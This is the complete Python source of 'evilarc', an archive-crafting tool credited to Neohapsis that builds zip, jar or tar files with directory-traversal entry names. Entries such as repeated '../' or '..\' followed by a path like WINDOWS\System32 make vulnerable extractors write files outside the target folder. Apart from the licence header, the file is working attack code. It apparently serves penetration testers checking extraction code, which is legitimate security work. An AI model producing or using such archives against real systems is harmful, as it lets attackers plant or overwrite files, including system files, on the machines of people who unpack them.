#!/usr/bin/env python
#
# Copyright (c) 2009, Neohapsis, Inc.
# All rights reserved.
#
# Implementation by Greg Ose and Patrick Toomey, updated for python3 by Leon Mailfert
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#  - Redistributions of source code must retain the above copyright notice, this list
#    of conditions and the following disclaimer.
#  - Redistributions in binary form must reproduce the above copyright notice, this
#    list of conditions and the following disclaimer in the documentation and/or
#    other materials provided with the distribution.
#  - Neither the name of Neohapsis nor the names of its contributors may be used to
#    endorse or promote products derived from this software without specific prior
#    written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
# ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import zipfile
import tarfile
import os
import argparse


def main():
    p = argparse.ArgumentParser(
        description="Create archive containing a file with directory traversal",
        prog="evilarc",
    )
    p.add_argument("infile", help="The file to add to the archive.")
    p.add_argument(
        "--output-file",
        "-f",
        help="File to output archive to.  Archive type is based off of file extension.  Supported extensions are zip, jar, tar, tar.bz2, tar.gz, and tgz.  Defaults to evil.zip.",
        default="evil.zip",
    )
    p.add_argument(
        "--depth",
        "-d",
        type=int,
        metavar="depth",
        help="Number directories to traverse. Defaults to 8.",
        default=8,
    )
    p.add_argument(
        "--os",
        "-o",
        metavar="platform",
        help="OS platform for archive (win|unix). Defaults to win.",
        default="win",
    )
    p.add_argument(
        "--path",
        "-p",
        metavar="path",
        help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\",
        default="",
    )
    args = p.parse_args()

    fname = args.infile
    if not os.path.exists(fname):
        print("Invalid input file")
        quit(1)

    if args.os == "win":
        dir = "..\\"
        if args.path and args.path[-1] != "\\":
            args.path += "\\"
    else:
        dir = "../"
        if args.path and args.path[-1] != "/":
            args.path += "/"

    zpath = dir * args.depth + args.path + os.path.basename(fname)
    ext = os.path.splitext(args.output_file)[1]
    if os.path.exists(args.output_file):
        wmode = "a"
    else:
        wmode = "w"
    if ext == ".zip" or ext == ".jar":
        zf = zipfile.ZipFile(args.output_file, wmode)
        zf.write(fname, zpath)
        zf.close()
        return
    elif ext == ".tar":
        mode = wmode
    elif ext == ".gz" or ext == ".tgz":
        mode = "w:gz"
    elif ext == ".bz2":
        mode = "w:bz2"
    else:
        print(f"Could not identify output archive format for {ext}")
        quit(1)

    print(f"Creating {args.output_file} containing {zpath}")
    tf = tarfile.open(args.output_file, mode)
    tf.add(fname, zpath)
    tf.close()


if __name__ == "__main__":
    main()
